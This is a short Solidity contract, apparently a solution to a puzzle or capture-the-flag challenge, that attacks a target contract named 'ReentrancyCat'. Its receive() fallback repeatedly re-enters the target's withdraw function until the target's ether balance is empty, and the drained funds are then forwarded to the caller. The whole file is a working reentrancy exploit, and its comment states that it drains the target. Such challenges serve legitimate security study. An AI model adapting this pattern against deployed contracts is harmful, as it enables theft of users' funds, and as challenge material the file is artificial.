// SPDX-License-Identifier: WTFPL
pragma solidity ^0.8.30;

interface IReentrancyCat {
    function deposit() external payable;
    function withdraw() external;
    function caress() external;
}

contract Seeker {
    IReentrancyCat immutable cat;

    constructor(address _cat) {
        cat = IReentrancyCat(_cat);
    }

    function caress() external payable {
        cat.deposit{value: msg.value}();
        cat.withdraw();
        // The reentrancy drains the cat's balance into this contract. Return everything to the
        // caller so nothing stays stuck in the Seeker — the cat is still emptied (and meows)
        // during the withdraw above; only gas is spent.
        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool ok, ) = msg.sender.call{value: bal}("");
            require(ok);
        }
    }

    receive() external payable {
        if (address(cat).balance > 0) {
            cat.withdraw();
        } else {
            cat.caress();
        }
    }
}
